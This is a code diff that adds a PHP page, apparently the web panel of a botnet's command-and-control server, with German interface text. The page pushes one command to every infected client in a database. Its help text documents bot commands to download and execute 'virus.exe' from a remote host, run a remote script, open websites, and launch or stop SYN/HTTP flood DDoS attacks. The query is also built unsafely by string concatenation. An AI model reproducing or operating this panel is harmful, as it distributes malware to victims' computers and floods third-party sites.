@@ -1,0 +1,62 @@
+<?php
+	if (isset($_POST['cmd'])) {
+		// CMD
+		include("inc/config.php");
+		include("inc/funcs.php");
+		$sql = "UPDATE `clients` SET `cmd` = '".dRead('cmd')."' WHERE 1;";
+		if (mysql_query($sql)) {
+			echo "Der Befehl wurde erfolgreich ausgef&uuml;hrt!";
+		} else {
+			echo "<b>Fehler aufgetreten!</b>";
+		}
+	} else {
+		
+?>	
+<table width="620" border="0" cellspacing="4" cellpadding="0">
+  <tr>
+    <td><strong>Befehle übergeben </strong></td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>Befehl:</td>
+  </tr>
+  <tr>
+    <td>
+      <input name="cmd" type="text" id="cmd" size="60" />    </td>
+  </tr>
+  <tr>
+    <td><div align="right">
+        <input type="submit" onClick="applyCmd(document.getElementById('cmd').value);" name="Submit" value="Befehl setzten" />
+    </div></td>
+  </tr>
+  <tr>
+            <p>!opensite!www.google.de!1!
+1 = visible | 0 = hidden
+</p>
+            <p><br>
+!webdl!www.ficken.de/virus.exe!%DesktopDirectory%\virus.exe!1!
+1 = execute | 0 = only dl
+</p>
+            <p><br>
+!stopflood!
+DDoS beenden : muss eingeben werden :-*
+</p>
+            <p><br>
+!flood!www.google.de!80!25!0!
+DDoS -&gt; www.google.de -&gt; port: 80 -&gt; interval: 25 ms -&gt; method = 0 &nbsp;interval je niedriger je mehr cpu usage
+method 0 - 1 | 0 syn 1 http
+</p>
+            <p><br>
+!script!www.google.de/stasi.script!
+execute stasi thread
+<br>
+</p>
+<td>&nbsp;</td>
+  </tr>
+  <tr>
+</table>
+<?php
+	}
+?>
